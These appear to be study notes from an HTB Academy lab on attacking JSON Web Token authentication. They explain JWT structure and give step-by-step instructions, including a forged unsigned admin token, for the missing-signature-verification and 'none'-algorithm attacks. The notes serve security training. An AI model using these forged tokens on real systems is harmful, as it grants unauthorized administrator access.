# Attacking Authentication Mechanisms

[JWT Debugger](https://jwt.lannysport.net/)

## JSON Web Token (JWT)

**Example**

```json
// header
{
  "alg": "HS256", // signature or MAC algorithm used
  "typ": "JWT"
}

// payload
{
  "iss": "HTB-Academy",
  "user": "admin",
  "isAdmin": true
}

// signature is computed based on the JWT's header, payload, and a secret signing key

// final format is header.payload.signature:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

### Attacking Signature Verification

#### Missing Signature Verification

- Login with non admin account
- Copy JWT token
- Decode at [JWT Debugger](https://jwt.lannysport.net/)
```json
{
  "user": "htb-stdnt",
  "isAdmin": false, // amend to true
  "exp": 1781047597
}
```
- Refresh landing page with with amended token

#### None Algorithm Attack

- Login with non admin account
- Copy JWT token
- Decode at [JWT Debugger](https://jwt.lannysport.net/)
- Amend header to none and payload as required:
```json
{"alg": "none", "typ": "JWT"}
{ 
  "user": "htb-stdnt",
  "isAdmin": true, 
  "exp": 1781047597
}
```
- In [CyberChef](https://gchq.github.io/CyberChef/) set "to base64" and select "URL safe" from the drop down
- Encode header and payload individually and combine separated by `.` and end with and additional `.` (no signature):
`eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyAKICAidXNlciI6ICJodGItc3RkbnQiLAogICJpc0FkbWluIjogdHJ1ZSwgCiAgImV4cCI6IDE3ODEwNDc1OTcKfQ.`
- Refresh landing page with with amended token